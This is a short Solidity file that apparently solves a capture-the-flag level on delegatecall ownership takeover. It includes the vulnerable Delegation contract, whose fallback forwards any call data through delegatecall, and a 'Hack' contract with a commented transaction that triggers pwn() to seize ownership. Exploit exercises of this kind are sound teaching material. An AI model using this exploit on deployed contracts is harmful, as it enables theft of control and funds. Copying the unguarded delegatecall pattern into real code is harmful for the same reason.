// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    function hack() external pure returns (bytes memory) {
        bytes memory selector = abi.encodeWithSignature("pwn()");
        return selector;
    }

    //await contract.sendTransaction({data:"0xdd365b8b"})
}

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

//0xD93C073faAE58B41E3Cee04bE9760B9831EEc211
